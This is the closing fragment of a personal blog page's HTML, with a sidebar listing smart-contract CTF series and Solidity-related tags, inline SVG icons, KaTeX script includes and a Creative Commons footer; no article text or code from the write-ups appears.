      <nav class="tags_nav">
        <a href='https://tqts.ar/series/capturetheether/' class="post_tag button button_translucent" title="capturetheether">
          CAPTURETHEETHER
          <span class="button_tally">5</span>
        </a>
        
        <a href='https://tqts.ar/series/ethernaut/' class="post_tag button button_translucent" title="ethernaut">
          ETHERNAUT
          <span class="button_tally">5</span>
        </a>
        
        <a href='https://tqts.ar/series/damnvulnerabledefi/' class="post_tag button button_translucent" title="damnvulnerabledefi">
          DAMNVULNERABLEDEFI
          <span class="button_tally">1</span>
        </a>
        
        <a href='https://tqts.ar/series/sherlock-ctf/' class="post_tag button button_translucent" title="sherlock-ctf">
          SHERLOCK-CTF
          <span class="button_tally">1</span>
        </a>
        
        
      </nav>
    </div>
    <div>
      <h2 class="mt-4 taxonomy" id="tags-section">Tags</h2>
      <nav class="tags_nav">
        <a href='https://tqts.ar/tags/remix/' class="post_tag button button_translucent" title="remix">
          REMIX
          <span class="button_tally">11</span>
        </a>
        
        <a href='https://tqts.ar/tags/solidity/' class="post_tag button button_translucent" title="solidity">
          SOLIDITY
          <span class="button_tally">11</span>
        </a>
        
        <a href='https://tqts.ar/tags/hardhat/' class="post_tag button button_translucent" title="hardhat">
          HARDHAT
          <span class="button_tally">2</span>
        </a>
        
        <a href='https://tqts.ar/tags/python/' class="post_tag button button_translucent" title="python">
          PYTHON
          <span class="button_tally">2</span>
        </a>
        
        
      </nav>
    </div>
  </section>
</aside>

  
</div>
    </main><svg width="0" height="0" class="hidden">
  <symbol viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" id="facebook">
    <path d="M437 0H75C33.648 0 0 33.648 0 75v362c0 41.352 33.648 75 75 75h151V331h-60v-90h60v-61c0-49.629 40.371-90 90-90h91v90h-91v61h91l-15 90h-76v181h121c41.352 0 75-33.648 75-75V75c0-41.352-33.648-75-75-75zm0 0"></path>
  </symbol>
  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 18.001 18.001" id="twitter">
    <path d="M15.891 4.013c.808-.496 1.343-1.173 1.605-2.034a8.68 8.68 0 0 1-2.351.861c-.703-.756-1.593-1.14-2.66-1.14-1.043 0-1.924.366-2.643 1.078a3.56 3.56 0 0 0-1.076 2.605c0 .309.039.585.117.819-3.076-.105-5.622-1.381-7.628-3.837-.34.601-.51 1.213-.51 1.846 0 1.301.549 2.332 1.645 3.089-.625-.053-1.176-.211-1.645-.47 0 .929.273 1.705.82 2.388a3.623 3.623 0 0 0 2.115 1.291c-.312.08-.641.118-.979.118-.312 0-.533-.026-.664-.083.23.757.664 1.371 1.291 1.841a3.652 3.652 0 0 0 2.152.743C4.148 14.173 2.625 14.69.902 14.69c-.422 0-.721-.006-.902-.038 1.697 1.102 3.586 1.649 5.676 1.649 2.139 0 4.029-.542 5.674-1.626 1.645-1.078 2.859-2.408 3.639-3.974a10.77 10.77 0 0 0 1.172-4.892v-.468a7.788 7.788 0 0 0 1.84-1.921 8.142 8.142 0 0 1-2.11.593z"
      ></path>
  </symbol>
  <symbol aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" id="mail">
    <path  d="M502.3 190.8c3.9-3.1 9.7-.2 9.7 4.7V400c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V195.6c0-5 5.7-7.8 9.7-4.7 22.4 17.4 52.1 39.5 154.1 113.6 21.1 15.4 56.7 47.8 92.2 47.6 35.7.3 72-32.8 92.3-47.6 102-74.1 131.6-96.3 154-113.7zM256 320c23.2.4 56.6-29.2 73.4-41.4 132.7-96.3 142.8-104.7 173.4-128.7 5.8-4.5 9.2-11.5 9.2-18.9v-19c0-26.5-21.5-48-48-48H48C21.5 64 0 85.5 0 112v19c0 7.4 3.4 14.3 9.2 18.9 30.6 23.9 40.7 32.4 173.4 128.7 16.8 12.2 50.2 41.8 73.4 41.4z"></path>
  </symbol>
  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" id="calendar">
    <path d="M452 40h-24V0h-40v40H124V0H84v40H60C26.916 40 0 66.916 0 100v352c0 33.084 26.916 60 60 60h392c33.084 0 60-26.916 60-60V100c0-33.084-26.916-60-60-60zm20 412c0 11.028-8.972 20-20 20H60c-11.028 0-20-8.972-20-20V188h432v264zm0-304H40v-48c0-11.028 8.972-20 20-20h24v40h40V80h264v40h40V80h24c11.028 0 20 8.972 20 20v48z"></path>
    <path d="M76 230h40v40H76zm80 0h40v40h-40zm80 0h40v40h-40zm80 0h40v40h-40zm80 0h40v40h-40zM76 310h40v40H76zm80 0h40v40h-40zm80 0h40v40h-40zm80 0h40v40h-40zM76 390h40v40H76zm80 0h40v40h-40zm80 0h40v40h-40zm80 0h40v40h-40zm80-80h40v40h-40z"></path>
  </symbol>
  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" id="github">
    <path d="M255.968 5.329C114.624 5.329 0 120.401 0 262.353c0 113.536 73.344 209.856 175.104 243.872 12.8 2.368 17.472-5.568 17.472-12.384 0-6.112-.224-22.272-.352-43.712-71.2 15.52-86.24-34.464-86.24-34.464-11.616-29.696-28.416-37.6-28.416-37.6-23.264-15.936 1.728-15.616 1.728-15.616 25.696 1.824 39.2 26.496 39.2 26.496 22.848 39.264 59.936 27.936 74.528 21.344 2.304-16.608 8.928-27.936 16.256-34.368-56.832-6.496-116.608-28.544-116.608-127.008 0-28.064 9.984-51.008 26.368-68.992-2.656-6.496-11.424-32.64 2.496-68 0 0 21.504-6.912 70.4 26.336 20.416-5.696 42.304-8.544 64.096-8.64 21.728.128 43.648 2.944 64.096 8.672 48.864-33.248 70.336-26.336 70.336-26.336 13.952 35.392 5.184 61.504 2.56 68 16.416 17.984 26.304 40.928 26.304 68.992 0 98.72-59.84 120.448-116.864 126.816 9.184 7.936 17.376 23.616 17.376 47.584 0 34.368-.32 62.08-.32 70.496 0 6.88 4.608 14.88 17.6 12.352C438.72 472.145 512 375.857 512 262.353 512 120.401 397.376 5.329 255.968 5.329z"></path>
  </symbol>
  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 212 212" id="gitlab">
    <path d="M12.3 74.7h54L43.3 3c-1-3.6-6.4-3.6-7.6 0L12.3 74.8z" />
    <path d="M12.3 74.7L.5 111c-1 3.2 0 6.8 3 8.8l101.6 74-92.5-119z"/>
    <path d="M105 193.7l-38.6-119h-54l92.7 119z"/>
    <path d="M105 193.7l38.7-119H66.4l38.7 119z"/>
    <path d="M105 193.7l38.7-119H198l-93 119z"/>
    <path d="M198 74.7l11.6 36.2c1 3 0 6.6-3 8.6l-101.5 74 93-119z"/>
    <path d="M198 74.7h-54.3L167 3c1.2-3.6 6.4-3.6 7.6 0L198 74.8z"/> 
  </symbol>
  <symbol viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" id="rss">
    <circle cx="3.429" cy="20.571" r="3.429"></circle>
    <path d="M11.429 24h4.57C15.999 15.179 8.821 8.001 0 8v4.572c6.302.001 11.429 5.126 11.429 11.428z"></path>
    <path d="M24 24C24 10.766 13.234 0 0 0v4.571c10.714 0 19.43 8.714 19.43 19.429z"></path>
  </symbol>
  <symbol viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" id="linkedin">
    <path d="M437 0H75C33.648 0 0 33.648 0 75v362c0 41.352 33.648 75 75 75h362c41.352 0 75-33.648 75-75V75c0-41.352-33.648-75-75-75zM181 406h-60V196h60zm0-240h-60v-60h60zm210 240h-60V286c0-16.54-13.46-30-30-30s-30 13.46-30 30v120h-60V196h60v11.309C286.719 202.422 296.93 196 316 196c40.691.043 75 36.547 75 79.688zm0 0"></path>
  </symbol>
  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 612 612" id="arrow">
    <path d="M604.501 440.509L325.398 134.956c-5.331-5.357-12.423-7.627-19.386-7.27-6.989-.357-14.056 1.913-19.387 7.27L7.499 440.509c-9.999 10.024-9.999 26.298 0 36.323s26.223 10.024 36.222 0l262.293-287.164L568.28 476.832c9.999 10.024 26.222 10.024 36.221 0 9.999-10.023 9.999-26.298 0-36.323z"></path>
  </symbol>
  <symbol viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" id="carly">
    <path d="M504.971 239.029L448 182.059V84c0-46.317-37.682-84-84-84h-44c-13.255 0-24 10.745-24 24s10.745 24 24 24h44c19.851 0 36 16.149 36 36v108c0 6.365 2.529 12.47 7.029 16.971L454.059 256l-47.029 47.029A24.002 24.002 0 0 0 400 320v108c0 19.851-16.149 36-36 36h-44c-13.255 0-24 10.745-24 24s10.745 24 24 24h44c46.318 0 84-37.683 84-84v-98.059l56.971-56.971c9.372-9.372 9.372-24.568 0-33.941zM112 192V84c0-19.851 16.149-36 36-36h44c13.255 0 24-10.745 24-24S205.255 0 192 0h-44c-46.318 0-84 37.683-84 84v98.059l-56.971 56.97c-9.373 9.373-9.373 24.568 0 33.941L64 329.941V428c0 46.317 37.682 84 84 84h44c13.255 0 24-10.745 24-24s-10.745-24-24-24h-44c-19.851 0-36-16.149-36-36V320c0-6.365-2.529-12.47-7.029-16.971L57.941 256l47.029-47.029A24.002 24.002 0 0 0 112 192z"></path>
  </symbol>
  <symbol viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" id="copy">
    <path d="M23 2.75A2.75 2.75 0 0 0 20.25 0H8.75A2.75 2.75 0 0 0 6 2.75v13.5A2.75 2.75 0 0 0 8.75 19h11.5A2.75 2.75 0 0 0 23 16.25zM18.25 14.5h-7.5a.75.75 0 0 1 0-1.5h7.5a.75.75 0 0 1 0 1.5zm0-3h-7.5a.75.75 0 0 1 0-1.5h7.5a.75.75 0 0 1 0 1.5zm0-3h-7.5a.75.75 0 0 1 0-1.5h7.5a.75.75 0 0 1 0 1.5z"></path>
    <path d="M8.75 20.5a4.255 4.255 0 0 1-4.25-4.25V2.75c0-.086.02-.166.025-.25H3.75A2.752 2.752 0 0 0 1 5.25v16A2.752 2.752 0 0 0 3.75 24h12a2.752 2.752 0 0 0 2.75-2.75v-.75z"></path>
  </symbol>
  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512.001 512.001" id="closeme">
    <path d="M284.286 256.002L506.143 34.144c7.811-7.811 7.811-20.475 0-28.285-7.811-7.81-20.475-7.811-28.285 0L256 227.717 34.143 5.859c-7.811-7.811-20.475-7.811-28.285 0-7.81 7.811-7.811 20.475 0 28.285l221.857 221.857L5.858 477.859c-7.811 7.811-7.811 20.475 0 28.285a19.938 19.938 0 0 0 14.143 5.857 19.94 19.94 0 0 0 14.143-5.857L256 284.287l221.857 221.857c3.905 3.905 9.024 5.857 14.143 5.857s10.237-1.952 14.143-5.857c7.811-7.811 7.811-20.475 0-28.285L284.286 256.002z"></path>
  </symbol>
  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" id="open-menu">
    <path d="M492 236H20c-11.046 0-20 8.954-20 20s8.954 20 20 20h472c11.046 0 20-8.954 20-20s-8.954-20-20-20zm0-160H20C8.954 76 0 84.954 0 96s8.954 20 20 20h472c11.046 0 20-8.954 20-20s-8.954-20-20-20zm0 320H20c-11.046 0-20 8.954-20 20s8.954 20 20 20h472c11.046 0 20-8.954 20-20s-8.954-20-20-20z"></path>
  </symbol>
  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" id="instagram">
    <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
  </symbol>
  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" id=youtube>
    <path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"/>
  </symbol>
  <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" id="stackoverflow">
    <path d="M21 27v-8h3v11H0V19h3v8h18z"></path><path d="M17.1.2L15 1.8l7.9 10.6 2.1-1.6L17.1.2zm3.7 14.7L10.6 6.4l1.7-2 10.2 8.5-1.7 2zM7.2 12.3l12 5.6 1.1-2.4-12-5.6-1.1 2.4zm-1.8 6.8l13.56 1.96.17-2.38-13.26-2.55-.47 2.97zM19 25H5v-3h14v3z"></path>
  </symbol>
</svg>



  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js" integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js" integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
<footer class="footer">
  <div class="footer_inner wrap pale">
    <img src='https://tqts.ar/logos/footer.png' class="icon icon_2 transparent" alt="tqts.ar">
    <p><span class="year"></span> - &nbsp;Written by tqts. All content under Creative Commons  <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">by-nc-sa</a></p><a class="to_top" href="#documentTop">
  <svg class="icon">
  <use xlink:href="#arrow"></use>
</svg>
</a>

  </div>
</footer>

    <script type="text/javascript" src="https://tqts.ar/js/bundle.min.061d04727b51b0a8fafe2f15b9370a961f33306e7af52abd00d69c906f5d825f1599306159d7756d7d2b4f359767a170625ae541d1f37d05c1daa4d5c7feec25.js" integrity="sha512-Bh0EcntRsKj6/i8VuTcKlh8zMG569Sq9ANackG9dgl8VmTBhWdd1bX0rTzWXZ6FwYlrlQdHzfQXB2qTVx/7sJQ==" crossorigin="anonymous"></script>
    
  </body>
</html>
